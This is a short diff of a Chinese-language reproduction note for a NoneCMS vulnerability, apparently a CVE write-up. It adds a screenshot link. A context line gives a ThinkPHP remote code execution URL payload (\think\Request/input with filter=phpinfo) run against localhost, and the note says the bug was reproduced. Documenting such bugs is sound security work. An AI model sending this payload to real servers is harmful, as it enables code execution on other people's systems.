@@ -23,3 +23,5 @@ http://localhost/NoneCMS/public/install/
 9、访问 http://localhost/NoneCMS/public/?s=index/\think\Request/input&filter=phpinfo&data=1
 
 完美复现！！！
+
+<img src="https://github.com/peng456/Security-PHP-CVE/blob/master/pic.png">
